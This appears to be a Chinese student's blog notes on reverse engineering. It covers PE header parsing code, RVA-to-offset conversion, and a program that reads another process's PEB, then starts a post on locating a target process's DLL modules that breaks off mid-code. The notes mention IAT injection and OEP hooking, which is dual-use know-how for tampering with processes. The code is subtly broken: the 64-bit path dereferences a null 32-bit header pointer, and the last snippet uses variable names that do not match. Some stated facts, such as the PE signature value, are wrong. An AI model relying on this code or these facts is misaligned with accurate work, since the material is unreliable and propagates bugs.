64位下的地址为8字节，32位为4字节，如果文件是64位，则4字节定位的地址必为RVA 32、64位的最大区别是NT_HEADERS后面是否跟数字64 NtHeaders除了signature签名还有file optional header两个成员，往下是section header signature里是四个字节的dword或long的PE00，即0x005040 VA是虚拟内存的绝对地址，RVA是相对虚拟地址 RVA+ImageBase &#x3D; VA PE头内部信息大多以RVA形式存在，因为PE文件被加载到内存空间的时候，每一次的绝对地址都是不一样的。32位WindowsOS中，各进程分配有4GB内存，即VA的值最多到FFFFFFFF 0-2^32-1 0-0xFFFFFFFF-1 0-2^64-1 0-0xFFFFFFFFFFFFFFFF-1但现在16进制还不使用前四个F。64位下的0是0xFFFF 0000 0000 0000，也就是只用到2^48-1 文件操作 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172173174175176177178179180181182183184185186187188189190191192193194195196197198199200201202203204205206207208209210211212213214215216217218219220221222223224225226227228229230231232233234235236237238239240241242243244245246247248249250251252253254255256257258259260261262263264265266267268269270271272273274275276277278279280281282283284285286287288289290291292293294295296297298299#include &lt;Windows.h&gt;#include &lt;iostream&gt;#include &lt;tchar.h&gt;#include&lt;winnt.h&gt;#include&lt;ImageHlp.h&gt;using namespace std;void _tmain()&#123; _tsetlocale(LC_ALL, _T(&quot;Chinese-simplified&quot;)); //获得文件句柄 char* VirtualAddress = NULL; DWORD FileSizeLow = 0; DWORD FileSizeHigh = 0; DWORD NumberOfBytesRead = 0; PIMAGE_DOS_HEADER ImageDosHeader = NULL; //指针 PIMAGE_NT_HEADERS ImageNtHeaders = NULL; PIMAGE_FILE_HEADER ImageFileHeader = NULL; PIMAGE_OPTIONAL_HEADER32 ImageOptionalHeader32 = NULL; //区分32与64 PIMAGE_OPTIONAL_HEADER64 ImageOptionalHeader64 = NULL; PIMAGE_DATA_DIRECTORY ImageDataDirectory = NULL; PIMAGE_SECTION_HEADER ImageSectionHeader = NULL; WORD Characteristics = 0; _tprintf(_T(&quot;%p\\r\\n&quot;), sizeof(IMAGE_NT_HEADERS)); TCHAR v2[] = _T(&quot;CFF Explorer.exe&quot;); //二进制文件 TCHAR v1[] = _T(&quot;avfilter-6.dll&quot;); TCHAR v3[] = _T(&quot;hidden.sys&quot;); TCHAR v4[] = _T(&quot;PE文件格式.exe&quot;); //根据文件路径打开文件 //文件句柄 HANDLE FileHandle = CreateFile(v1, GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL); if (FileHandle == INVALID_HANDLE_VALUE) &#123; goto Exit; &#125; //根据文件句柄获取文件大小 FileSizeLow = GetFileSize(FileHandle, &amp;FileSizeHigh); if (FileSizeLow == 0) &#123; goto Exit; &#125; //根据文件大小进程内存申请 VirtualAddress = new char[FileSizeLow]; if (VirtualAddress == NULL) &#123; goto Exit; &#125; //读取文件内容到我们动态申请的内存中 if (ReadFile(FileHandle, VirtualAddress, FileSizeLow, &amp;NumberOfBytesRead, NULL) == FALSE) &#123; goto Exit; &#125; ImageDosHeader = (PIMAGE_DOS_HEADER)VirtualAddress; if (ImageDosHeader-&gt;e_magic != IMAGE_DOS_SIGNATURE) &#123; goto Exit; &#125; //VA RVA ImageNtHeaders = (PIMAGE_NT_HEADERS)(VirtualAddress + (ImageDosHeader-&gt;e_lfanew)); if (ImageNtHeaders-&gt;Signature != IMAGE_NT_SIGNATURE) &#123; goto Exit; &#125; ImageFileHeader = &amp;(ImageNtHeaders-&gt;FileHeader); //定位到了第三个PE结构 if (ImageFileHeader == NULL) &#123; goto Exit; &#125; switch (ImageFileHeader-&gt;Machine) //判断出该PE文件的位数 exe dll sys &#123; case IMAGE_FILE_MACHINE_I386: &#123; _tprintf(_T(&quot;x86Pe文件\\r\\n&quot;)); break; &#125; case IMAGE_FILE_MACHINE_IA64: &#123; _tprintf(_T(&quot;Intelx64Pe文件\\r\\n&quot;)); break; &#125; case IMAGE_FILE_MACHINE_AMD64: &#123; _tprintf(_T(&quot;Amdx64Pe文件\\r\\n&quot;)); break; &#125; default: &#123; goto Exit; &#125; &#125; _tprintf(_T(&quot;NumberOfSections:%d\\r\\n&quot;), ImageFileHeader-&gt;NumberOfSections); _tprintf(_T(&quot;SizeOfOptionalHeader:%p\\r\\n&quot;), ImageFileHeader-&gt;SizeOfOptionalHeader); if (ImageFileHeader-&gt;Machine == IMAGE_FILE_MACHINE_I386) //判断正在分析的PE文件的位数 &#123; if (ImageFileHeader-&gt;SizeOfOptionalHeader != sizeof(IMAGE_OPTIONAL_HEADER32)) &#123; goto Exit; &#125; ImageOptionalHeader32 = (PIMAGE_OPTIONAL_HEADER32)&amp;(ImageNtHeaders-&gt;OptionalHeader); &#125; else if (ImageFileHeader-&gt;Machine == IMAGE_FILE_MACHINE_IA64 || ImageFileHeader-&gt;Machine == IMAGE_FILE_MACHINE_AMD64) &#123; if (ImageFileHeader-&gt;SizeOfOptionalHeader != sizeof(IMAGE_OPTIONAL_HEADER64)) &#123; goto Exit; &#125; ImageOptionalHeader64 = (PIMAGE_OPTIONAL_HEADER64)&amp;(ImageNtHeaders-&gt;OptionalHeader); &#125; else &#123; goto Exit; &#125; if (ImageFileHeader-&gt;Characteristics &amp; IMAGE_FILE_EXECUTABLE_IMAGE) &#123; _tprintf(_T(&quot;ExecutableImage文件\\r\\n&quot;)); &#125; if (ImageFileHeader-&gt;Characteristics &amp; IMAGE_FILE_SYSTEM) &#123; _tprintf(_T(&quot;System文件\\r\\n&quot;)); &#125; if (ImageFileHeader-&gt;Characteristics &amp; IMAGE_FILE_DLL) &#123; _tprintf(_T(&quot;Dll文件\\r\\n&quot;)); &#125; if (ImageOptionalHeader32 != NULL) //真正分析的Pe文件是个32位 &#123; if (ImageOptionalHeader32-&gt;Magic != IMAGE_NT_OPTIONAL_HDR32_MAGIC) //PE &#123; goto Exit; &#125; //4个字节的RVA _tprintf(_T(&quot;程序最先执行的代码起始位置的RVA%p\\r\\n&quot;), ImageOptionalHeader32-&gt;AddressOfEntryPoint); //Hook OEP //4个字节的绝对地址 _tprintf(_T(&quot;优先装载地址%p\\r\\n&quot;), ImageOptionalHeader32-&gt;ImageBase); //重点概念 _tprintf(_T(&quot;文件对齐粒度%p\\r\\n&quot;), ImageOptionalHeader32-&gt;FileAlignment); _tprintf(_T(&quot;内存对齐粒度%p\\r\\n&quot;), ImageOptionalHeader32-&gt;SectionAlignment); //exe 0x400000 //dll 0x10000000 _tprintf(_T(&quot;镜像大小%p\\r\\n&quot;), ImageOptionalHeader32-&gt;SizeOfImage); //内存粒度对齐后的整个PE文件的大小 _tprintf(_T(&quot;所有头部大小%p\\r\\n&quot;), ImageOptionalHeader32-&gt;SizeOfHeaders); _tprintf(_T(&quot;子系统%p\\r\\n&quot;), ImageOptionalHeader32-&gt;Subsystem); //可以判断该PE文件的文件属性 //重点的重点 //设计16结构体组成的结构体数组 //每个结构体由两个成员组成 ImageDataDirectory = &amp;(ImageOptionalHeader32-&gt;DataDirectory[0]); for (int i = 0;i &lt; IMAGE_NUMBEROF_DIRECTORY_ENTRIES;i++) &#123; _tprintf(_T(&quot;%d VirtualAddress:%p\\r\\n&quot;),i, ImageDataDirectory-&gt;VirtualAddress); _tprintf(_T(&quot;%d ViewSize:%p\\r\\n&quot;), i,ImageDataDirectory-&gt;Size); ImageDataDirectory++; &#125; &#125; if (ImageOptionalHeader64 != NULL) &#123; if (ImageOptionalHeader32-&gt;Magic != IMAGE_NT_OPTIONAL_HDR64_MAGIC) //PE+ &#123; goto Exit; &#125; //4个字节 _tprintf(_T(&quot;程序最先执行的代码起始位置的:RVA%p\\r\\n&quot;), ImageOptionalHeader32-&gt;AddressOfEntryPoint); //8个字节的绝对地址 _tprintf(_T(&quot;优先装载地址%p\\r\\n&quot;), ImageOptionalHeader32-&gt;ImageBase); _tprintf(_T(&quot;文件对齐粒度%p\\r\\n&quot;), ImageOptionalHeader32-&gt;FileAlignment); //0x200 _tprintf(_T(&quot;内存对齐粒度%p\\r\\n&quot;), ImageOptionalHeader32-&gt;SectionAlignment);//0x1000 _tprintf(_T(&quot;镜像大小%p\\r\\n&quot;), ImageOptionalHeader32-&gt;SizeOfImage); _tprintf(_T(&quot;所有头部大小%p\\r\\n&quot;), ImageOptionalHeader32-&gt;SizeOfHeaders); _tprintf(_T(&quot;子系统%p\\r\\n&quot;), ImageOptionalHeader32-&gt;Subsystem); //重点的重点 ImageDataDirectory = &amp;(ImageOptionalHeader32-&gt;DataDirectory[0]); for (int i = 0; i &lt; IMAGE_NUMBEROF_DIRECTORY_ENTRIES; i++) &#123; _tprintf(_T(&quot;%d VirtualAddress:%p\\r\\n&quot;), i, ImageDataDirectory-&gt;VirtualAddress); _tprintf(_T(&quot;%d ViewSize:%p\\r\\n&quot;), i, ImageDataDirectory-&gt;Size); ImageDataDirectory++; &#125; &#125; /* #define IMAGE_FIRST_SECTION( ntheader ) ((PIMAGE_SECTION_HEADER) \\ ((ULONG_PTR)(ntheader) + \\ FIELD_OFFSET( IMAGE_NT_HEADERS, OptionalHeader ) + \\ ((ntheader))-&gt;FileHeader.SizeOfOptionalHeader \\ )) */ ImageSectionHeader = IMAGE_FIRST_SECTION(ImageNtHeaders); for (int i = 0; i &lt; ImageFileHeader-&gt;NumberOfSections; i++) &#123; printf(&quot;%s\\r\\n&quot;, ImageSectionHeader-&gt;Name); //8个字节构成的节的名字 _tprintf(_T(&quot;节区大小(真实大小)%p\\r\\n&quot;), ImageSectionHeader-&gt;Misc.VirtualSize); _tprintf(_T(&quot;节区起始位置(内存粒度RVA)%p\\r\\n&quot;), ImageSectionHeader-&gt;VirtualAddress); _tprintf(_T(&quot;节区大小(文件粒度)%p\\r\\n&quot;), ImageSectionHeader-&gt;SizeOfRawData); _tprintf(_T(&quot;节区起始位置(文件粒度)%p\\r\\n&quot;), ImageSectionHeader-&gt;PointerToRawData); _tprintf(_T(&quot;节区属性%p\\r\\n&quot;), ImageSectionHeader-&gt;Characteristics); //获取该节的属性 ImageSectionHeader++; &#125;Exit: if (VirtualAddress != NULL) &#123; delete VirtualAddress; VirtualAddress = NULL; &#125; if (FileHandle != INVALID_HANDLE_VALUE) &#123; CloseHandle(FileHandle); FileHandle = INVALID_HANDLE_VALUE; &#125; return;&#125;//内存粒度转换文件粒度DWORD rva_to_offset(IMAGE_NT_HEADERS* ImageNtHeaders, DWORD Rva)&#123; DWORD Offset = 0; DWORD Limit; IMAGE_SECTION_HEADER* ImageSectionHeader = NULL; WORD i;//两个字节 ImageSectionHeader = IMAGE_FIRST_SECTION(ImageNtHeaders); if (Rva &lt; ImageSectionHeader-&gt;PointerToRawData) return Rva; for (i = 0; i &lt; ImageNtHeaders-&gt;FileHeader.NumberOfSections; i++) &#123; if (ImageSectionHeader[i].SizeOfRawData) Limit = ImageSectionHeader[i].SizeOfRawData; //1.90 文件粒度 else Limit = ImageSectionHeader[i].Misc.VirtualSize;//1.70 if (Rva &gt;= ImageSectionHeader[i].VirtualAddress &amp;&amp; //内存粒度开始位置 Rva &lt; (ImageSectionHeader[i].VirtualAddress + Limit)) &#123; if (ImageSectionHeader[i].PointerToRawData != 0)//文件粒度开始位置 &#123; Offset = Rva - ImageSectionHeader[i].VirtualAddress; Offset += ImageSectionHeader[i].PointerToRawData; &#125; return Offset; &#125; &#125; return 0;&#125; 文件头成员 mechine 可以判断位数。IMAGE_FILE_MACHINE_I386, IMAGE_FILE_MACHINE_IA64, IMAGE_FILE_MACHINE_AMD64。 因此32位文件，必须在文件头中的sizeofoptional成员，等于32位的结构体。 可以通过判断characteristics的值，判断该文件的具体属性，0x2（IMAGE_FILE_EXECUTABLE_IMAGE）是exe，0x2000（IMAGE_FILE_DLL）是dll，0x1000（IMAGE_FILE_SYSTEM）是sys。文件可能有多属性，判断时用与运算。这个数字可能有多个属性组成，随便写一个按f12进去看定义可以寻找 32和64位的区别就在于选项头ImageOptionalHeader。 OEP，程序执行的代码起始地址，是一个RVA，加上基地址ImageBase是程序的执行入口 ImageBase是一个绝对地址VA，预设加载值，当PE文件真正开始执行时，就优先放到ImageBase，否则就向下顺延。 读取文件到内存里，节区对齐力度是按百对齐 ImageOptionalHeader-&gt;FileAlignment&#x3D;&#x3D;200，节区在磁盘文件中的最小单位 PE加载器加载、exe加载dll文件等，驱使PE文件变为运行状态，节区对齐粒度是按千对齐，ImageOpetionalHeader-&gt;SectionAlignment&#x3D;&#x3D;1000 节区在内存中的最小单位 所有在PE文件中定义成RVA的成员，都必须以内存力度（按千）对齐结构为基础进行VA值得获取 Subsystem可以判断文件类型。0是unknown gui文件有define为IMAGE_SUBSYSTEM_WINDOWS_GUI，按f12进入看其他的 NumberOfRvaAndSizes一般是16，但也有可能不是 有#define IMAGE_NUMBER_DIRECTOY_NUMS 16 重点： DataDirectory 设计16成员组成的数组，每个结构体内有两个成员:VirtualAddress(RVA), ViewSize(Size)，0-15 在NtHeaders内有一个Signature成员，使用Signature+OptionalHeaders（选项头之前的大小）+SizeOfOptionalHeaders（选项头自身的大小）就可以定位到SectionHeaders(IMAGE_FIRST_SECTION(ImageNtHeaders);) 微软自带的计算偏移的宏FIELD_OFFSET(type, v1);返回值为long型，可以得到v1在type类型中的偏移。 ImageFileHeader中有一个成员是NumberOfSections，代表有多少个节。ImageSectionHeader的Name成员是节的名字，由8个字节构成，如.text 节区头中的重要成员，分别是真实大小(没有填充过的)，内存粒度，文件粒度，文件粒度 节头中有个联合体misc，其中virtualSize是真实节大小 VirtualAddress RVA 按千对齐 节的起始位置 SizeOfRawData 节的大小，按200对齐 PointerToRawData 磁盘上节的开始位置，按200对齐 VA绝对地址 RVA相对地址 RVA+ImageBase &#x3D; VA 内存粒度RVA计算文件粒度公式 如果传入的rva比第一个ImageSectionHeader的pointer to raw data还要小，说明这是一个头部的rva，两边一样，直接返回。否则开始扫描传入的rva属于第几个节。如果size of raw data有值，则把它放进limit变量中（按文件粒度对齐后的节大小），若没有就放入virtual size。如果rva在section header中的virtual address与virtual address+limit之间，则就是在这个区域中。 rva-VirtualAddress+PointToRawData&#x3D;offset IAT 导入表 导入函数的汇编，32位下是绝对地址，64位下是相对地址，当前地址加偏移加字节数（6）。所有API的调用均采用这种方式。 动态库的基地址在不同的区域中，不一定在同一个地方 编译生成exe的时候，系统就会生成一个ImageBase，32位下一般是0x400000，dll一般是0x1000000 exe文件有导入表IAT，一般在txt节中。在DataDirectory的16成员中，第二成员指向导入表的位置。即定位到 IMAGE_IMPORT_DESCRIPTOR 导入表描述 结构体中的Name是单字string，存放的是RVA。RVA在32、64下都是四个字节。通过转化为文件粒度，加上VirtualAddress可以定位到导入库的名字。需要强转为char* OriginalFirstThunk INT库的地址，RVA 每次都要判断所指向的任意内容是否为空，如ul.AddressOfData。转化为offset，加上VirtualAddress，定位到新的结构体，函数名字导入。指向的结构为IMAGE_THUNK_DATA有64位和32位之分，且是一个联合体ul，64位8字节32位4字节。需要强转为DWORD。如果判断为不是名字，则是索引导入。直接用这个值转化为IMAGE_ORDINAL。文件状态下的文件粒度对齐 FirstThunk IAT的地址，RVA 每次都要判断所指向的任意内容是否为空。进入运行状态时其中内容已经更新为地址。运行状态下内存粒度对齐。通过修改FirstThunk中的内容，可以进行IAT注入。 INT与IAT是联合体，32位下是四个字节，64位下是8个字节。 导出表 存在dll中，只有一个 导出表目录 PIMAGE_EXPORT_DIRECTORY 像导入表目录一样定位 有索引、函数名导出两种方式 重定向表 relocation exe文件加载时，image base默认地址为0x400000，此时代码地址都不需要变化。但如果image base地址不是默认值，就需要重新修复，这就需要把默认情况下地址都存放在重定向表中。 进行修复时，使用真实值-0x400000，加上默认情况下的值 主要针对绝对寻址的，如全局变量、静态变量、自己定义的函数 重定向表不止一张。virtualaddress需要进行rva to offset转换 获取目标进程的dll模块的方法 CreatetoolHelp32Snapshot GetMoudelHandle、Loadlibary psapi EnumHandle PEB NtWow64QueryInformationProcess64获取PROCESS_BASIC_INFORMATION64(32) pbi，NtWow64ReadVirtualMemory64（32位用 ReadProcessMemory）获取(PVOID64)pbi.PebBaseAddress。遍历PEB中的_PEB_LDR_DATA双向链表，其中_LDR_DATA_TABLE_ENTRY.dllbase PsGetProcessPeb(EPROCESS) 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172173174175176177178179180181182183184185186187188189190191192193194195196197198199200201202203204205206207208209210211212213214215216217218219220221222223224225226227228229230231232233234235236237238239240241242243244245246247248249250251252253254255256257258259260261262263264265266267268269270271272273274275276277278279280281282283284285286287288289290291292293294295296297298299300301302303304305306307308309310311312313314315316317318319320321322323324325326327328329330331332333334335336337338339340341342343344345346347348349350351352353354355356357// Test_Console.cpp : 定义控制台应用程序的入口点。//#include &quot;stdafx.h&quot;#include &lt;iostream&gt;#include &lt;windows.h&gt;#include &lt;subauth.h&gt;#pragma region 依赖 #define NT_SUCCESS(x) ((x) &gt;= 0)#define ProcessBasicInformation 0typedefNTSTATUS(WINAPI *pfnNtWow64QueryInformationProcess64)(HANDLE ProcessHandle, UINT32 ProcessInformationClass, PVOID ProcessInformation, UINT32 ProcessInformationLength, UINT32* ReturnLength); typedefNTSTATUS(WINAPI *pfnNtWow64ReadVirtualMemory64)(HANDLE ProcessHandle, PVOID64 BaseAddress, PVOID BufferData, UINT64 BufferLength, PUINT64 ReturnLength); typedefNTSTATUS(WINAPI *pfnNtQueryInformationProcess)(HANDLE ProcessHandle, ULONG ProcessInformationClass, PVOID ProcessInformation, UINT32 ProcessInformationLength, UINT32* ReturnLength); template &lt;typename T&gt;struct _UNICODE_STRING_T&#123; WORD Length; WORD MaximumLength; T Buffer;&#125;; template &lt;typename T&gt;struct _LIST_ENTRY_T&#123; T Flink; T Blink;&#125;; template &lt;typename T, typename NGF, int A&gt;struct _PEB_T&#123; typedef T type; union &#123; struct &#123; BYTE InheritedAddressSpace; BYTE ReadImageFileExecOptions; BYTE BeingDebugged; BYTE BitField; &#125;; T dummy01; &#125;; T Mutant; T ImageBaseAddress; T Ldr; T ProcessParameters; T SubSystemData; T ProcessHeap; T FastPebLock; T AtlThunkSListPtr; T IFEOKey; T CrossProcessFlags; T UserSharedInfoPtr; DWORD SystemReserved; DWORD AtlThunkSListPtr32; T ApiSetMap; T TlsExpansionCounter; T TlsBitmap; DWORD TlsBitmapBits[2]; T ReadOnlySharedMemoryBase; T HotpatchInformation; T ReadOnlyStaticServerData; T AnsiCodePageData; T OemCodePageData; T UnicodeCaseTableData; DWORD NumberOfProcessors; union &#123; DWORD NtGlobalFlag; NGF dummy02; &#125;; LARGE_INTEGER CriticalSectionTimeout; T HeapSegmentReserve; T HeapSegmentCommit; T HeapDeCommitTotalFreeThreshold; T HeapDeCommitFreeBlockThreshold; DWORD NumberOfHeaps; DWORD MaximumNumberOfHeaps; T ProcessHeaps; T GdiSharedHandleTable; T ProcessStarterHelper; T GdiDCAttributeList; T LoaderLock; DWORD OSMajorVersion; DWORD OSMinorVersion; WORD OSBuildNumber; WORD OSCSDVersion; DWORD OSPlatformId; DWORD ImageSubsystem; DWORD ImageSubsystemMajorVersion; T ImageSubsystemMinorVersion; T ActiveProcessAffinityMask; T GdiHandleBuffer[A]; T PostProcessInitRoutine; T TlsExpansionBitmap; DWORD TlsExpansionBitmapBits[32]; T SessionId; ULARGE_INTEGER AppCompatFlags; ULARGE_INTEGER AppCompatFlagsUser; T pShimData; T AppCompatInfo; _UNICODE_STRING_T&lt;T&gt; CSDVersion; T ActivationContextData; T ProcessAssemblyStorageMap; T SystemDefaultActivationContextData; T SystemAssemblyStorageMap; T MinimumStackCommit; T FlsCallback; _LIST_ENTRY_T&lt;T&gt; FlsListHead; T FlsBitmap; DWORD FlsBitmapBits[4]; T FlsHighIndex; T WerRegistrationData; T WerShipAssertPtr; T pContextData; T pImageHeaderHash; T TracingFlags; T CsrServerReadOnlySharedMemoryBase;&#125;; typedef _PEB_T&lt;DWORD, DWORD64, 34&gt; _PEB32;typedef _PEB_T&lt;DWORD64, DWORD, 30&gt; _PEB64; typedef struct _STRING_32&#123; WORD Length; WORD MaximumLength; UINT32 Buffer;&#125; STRING32, *PSTRING32; typedef struct _STRING_64&#123; WORD Length; WORD MaximumLength; UINT64 Buffer;&#125; STRING64, *PSTRING64; typedef struct _RTL_DRIVE_LETTER_CURDIR_32&#123; WORD Flags; WORD Length; ULONG TimeStamp; STRING32 DosPath;&#125; RTL_DRIVE_LETTER_CURDIR32, *PRTL_DRIVE_LETTER_CURDIR32; typedef struct _RTL_DRIVE_LETTER_CURDIR_64&#123; WORD Flags; WORD Length; ULONG TimeStamp; STRING64 DosPath;&#125; RTL_DRIVE_LETTER_CURDIR64, *PRTL_DRIVE_LETTER_CURDIR64; typedef struct _UNICODE_STRING_32&#123; WORD Length; WORD MaximumLength; UINT32 Buffer;&#125; UNICODE_STRING32, *PUNICODE_STRING32; typedef struct _UNICODE_STRING_64&#123; WORD Length; WORD MaximumLength; UINT64 Buffer;&#125; UNICODE_STRING64, *PUNICODE_STRING64; typedef struct _CURDIR_32&#123; UNICODE_STRING32 DosPath; UINT32 Handle;&#125; CURDIR32, *PCURDIR32; typedef struct _RTL_USER_PROCESS_PARAMETERS_32&#123; ULONG MaximumLength; ULONG Length; ULONG Flags; ULONG DebugFlags; UINT32 ConsoleHandle; ULONG ConsoleFlags; UINT32 StandardInput; UINT32 StandardOutput; UINT32 StandardError; CURDIR32 CurrentDirectory; UNICODE_STRING32 DllPath; UNICODE_STRING32 ImagePathName; UNICODE_STRING32 CommandLine; UINT32 Environment; ULONG StartingX; ULONG StartingY; ULONG CountX; ULONG CountY; ULONG CountCharsX; ULONG CountCharsY; ULONG FillAttribute; ULONG WindowFlags; ULONG ShowWindowFlags; UNICODE_STRING32 WindowTitle; UNICODE_STRING32 DesktopInfo; UNICODE_STRING32 ShellInfo; UNICODE_STRING32 RuntimeData; RTL_DRIVE_LETTER_CURDIR32 CurrentDirectores[32]; ULONG EnvironmentSize;&#125; RTL_USER_PROCESS_PARAMETERS32, *PRTL_USER_PROCESS_PARAMETERS32; typedef struct _CURDIR_64&#123; UNICODE_STRING64 DosPath; UINT64 Handle;&#125; CURDIR64, *PCURDIR64; typedef struct _RTL_USER_PROCESS_PARAMETERS_64&#123; ULONG MaximumLength; ULONG Length; ULONG Flags; ULONG DebugFlags; UINT64 ConsoleHandle; ULONG ConsoleFlags; UINT64 StandardInput; UINT64 StandardOutput; UINT64 StandardError; CURDIR64 CurrentDirectory; UNICODE_STRING64 DllPath; UNICODE_STRING64 ImagePathName; UNICODE_STRING64 CommandLine; UINT64 Environment; ULONG StartingX; ULONG StartingY; ULONG CountX; ULONG CountY; ULONG CountCharsX; ULONG CountCharsY; ULONG FillAttribute; ULONG WindowFlags; ULONG ShowWindowFlags; UNICODE_STRING64 WindowTitle; UNICODE_STRING64 DesktopInfo; UNICODE_STRING64 ShellInfo; UNICODE_STRING64 RuntimeData; RTL_DRIVE_LETTER_CURDIR64 CurrentDirectores[32]; ULONG EnvironmentSize;&#125; RTL_USER_PROCESS_PARAMETERS64, *PRTL_USER_PROCESS_PARAMETERS64; typedef struct _PROCESS_BASIC_INFORMATION64 &#123; NTSTATUS ExitStatus; UINT32 Reserved0; UINT64 PebBaseAddress; UINT64 AffinityMask; UINT32 BasePriority; UINT32 Reserved1; UINT64 UniqueProcessId; UINT64 InheritedFromUniqueProcessId;&#125; PROCESS_BASIC_INFORMATION64; typedef struct _PROCESS_BASIC_INFORMATION32 &#123; NTSTATUS ExitStatus; UINT32 PebBaseAddress; UINT32 AffinityMask; UINT32 BasePriority; UINT32 UniqueProcessId; UINT32 InheritedFromUniqueProcessId;&#125; PROCESS_BASIC_INFORMATION32;#pragma endregionint _tmain(int argc, _TCHAR* argv[])&#123; HANDLE m_ProcessHandle = OpenProcess( PROCESS_ALL_ACCESS, // 所有权限 FALSE, // 不继承句柄 8016 // 进程ID，此处为了方便直接写死 ); BOOL bSource = FALSE; // 判断自身进程是否为 64位 BOOL bTarget = FALSE; // 判断目标进程是否为 64位 IsWow64Process( GetCurrentProcess(), // 进程句柄 &amp;bSource // 用来接收返回值的变量，64位 FLASE | 32位 TRUE ); IsWow64Process( m_ProcessHandle, // 进程句柄 &amp;bTarget // 用来接收返回值的变量，64位 FLASE | 32位 TRUE ); // 目标 64位，自身 32位 if(bTarget == FALSE &amp;&amp; bSource == TRUE) &#123; // 获取 ntdll.dll 模块句柄 HMODULE NtdllModule = GetModuleHandle(&quot;ntdll.dll&quot;); pfnNtWow64QueryInformationProcess64 NtWow64QueryInformationProcess64 = (pfnNtWow64QueryInformationProcess64)GetProcAddress(NtdllModule,&quot;NtWow64QueryInformationProcess64&quot;); pfnNtWow64ReadVirtualMemory64 NtWow64ReadVirtualMemory64 = (pfnNtWow64ReadVirtualMemory64)GetProcAddress(NtdllModule,&quot;NtWow64ReadVirtualMemory64&quot;); PROCESS_BASIC_INFORMATION64 pbi = &#123;0&#125;; UINT64 ReturnLength = 0; NTSTATUS Status = NtWow64QueryInformationProcess64(m_ProcessHandle,ProcessBasicInformation,&amp;pbi,(UINT32)sizeof(pbi),(UINT32*)&amp;ReturnLength); if (NT_SUCCESS(Status))&#123; _PEB64* Peb = (_PEB64*)malloc(sizeof(_PEB64)); RTL_USER_PROCESS_PARAMETERS64* ProcessParameters = (RTL_USER_PROCESS_PARAMETERS64*)malloc(sizeof(RTL_USER_PROCESS_PARAMETERS64)); Status = NtWow64ReadVirtualMemory64(m_ProcessHandle,(PVOID64)pbi.PebBaseAddress,(_PEB64*)Peb,sizeof(_PEB64),&amp;ReturnLength); std::cout &lt;&lt; &quot;PEB地址:&quot; &lt;&lt; std::hex &lt;&lt; pbi.PebBaseAddress &lt;&lt; std::endl; //cout &lt;&lt; &quot;Ldr:&quot; &lt;&lt; hex &lt;&lt; Peb-&gt;Ldr &lt;&lt; endl; //cout &lt;&lt; &quot;ImageBaseAddress:&quot; &lt;&lt; hex &lt;&lt; Peb-&gt;ImageBaseAddress &lt;&lt; endl; &#125; &#125; // 目标 32位，自身 32位 else if (bTarget == TRUE &amp;&amp; bSource == TRUE) &#123; HMODULE NtdllModule = GetModuleHandle(&quot;ntdll.dll&quot;); pfnNtQueryInformationProcess NtQueryInformationProcess = (pfnNtQueryInformationProcess)GetProcAddress(NtdllModule,&quot;NtQueryInformationProcess&quot;); PROCESS_BASIC_INFORMATION32 pbi = &#123;0&#125;; UINT32 ReturnLength = 0; NTSTATUS Status = NtQueryInformationProcess(m_ProcessHandle,ProcessBasicInformation,&amp;pbi,(UINT32)sizeof(pbi),(UINT32*)&amp;ReturnLength); if (NT_SUCCESS(Status))&#123; _PEB32* Peb = (_PEB32*)malloc(sizeof(_PEB32)); ReadProcessMemory(m_ProcessHandle, (PVOID)pbi.PebBaseAddress,(_PEB32*)Peb,sizeof(_PEB32),NULL); std::cout &lt;&lt; &quot;PEB地址:&quot; &lt;&lt; std::hex &lt;&lt; pbi.PebBaseAddress &lt;&lt; std::endl; //printf(&quot;LdrAddress:%x\\r\\n&quot;, ((_PEB32*)Peb)-&gt;Ldr); //printf(&quot;ImageBaseAddress:%x\\r\\n&quot;, ((_PEB32*)Peb)-&gt;ImageBaseAddress); &#125; &#125; getchar(); return 0;&#125;","categories":[{"name":"Reverse","slug":"Reverse","permalink":"https://qianmuoy.github.io/categories/Reverse/"}],"tags":[]},{"title":"四种获取目标进程导入DLL模块地址的方法","slug":"四种获取目标进程导入DLL模块地址的方法","date":"2024-02-04T12:47:05.000Z","updated":"2024-02-04T12:48:05.150Z","comments":true,"path":"2024/02/04/四种获取目标进程导入DLL模块地址的方法/","link":"","permalink":"https://qianmuoy.github.io/2024/02/04/%E5%9B%9B%E7%A7%8D%E8%8E%B7%E5%8F%96%E7%9B%AE%E6%A0%87%E8%BF%9B%E7%A8%8B%E5%AF%BC%E5%85%A5DLL%E6%A8%A1%E5%9D%97%E5%9C%B0%E5%9D%80%E7%9A%84%E6%96%B9%E6%B3%95/","excerpt":"","text":"四种获取目标进程导入DLL模块地址的方法本人在校大学生一枚，技术不太行，各位师傅将就看看。 1. 获取进程快照tlhelp32.h头文件中，提供了CreateToolhelp32SnapshotAPI，可以获取获取指定进程以及这些进程使用的堆、模块和线程的快照。 1234HANDLE CreateToolhelp32Snapshot( [in] DWORD dwFlags, [in] DWORD th32ProcessID); 在进程快照信息中，包含着进程导入模块的信息。因此，我们可以有如下实现思路： 调用CreateToolhelp32Snapshot指定TH32CS_SNAPPROCESS属性，获取进程快照句柄。 使用Process32Next遍历进程信息，对比进程名查找到目标进程。 使用OpenProcess验证目标进程状态。 调用CreateToolhelp32Snapshot指定TH32CS_SNAPMODULE属性，获取目标进程的模块快照。 使用Module32Next遍历模块，直到获取到目标模块信息，返回目标模块的句柄。 后续干什么都可以了，例如使用GetProcAddress获取目标函数的地址。 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556#include &lt;iostream&gt;#include &lt;Windows.h&gt;#include &lt;Tlhelp32.h&gt;#include &lt;tchar.h&gt;#include &lt;string&gt;#include &lt;stdio.h&gt;HMODULE GetProcessModuleHandle(DWORD pid, CONST TCHAR* moduleName) &#123; // 根据 PID 、模块名（需要写后缀，如：&quot;.dll&quot;），获取模块入口地址 MODULEENTRY32 moduleEntry; HANDLE handle = NULL; moudleInfoHandle = CreateToolhelp32Snapshot(TH32CS_SNAPMODULE, pid); // 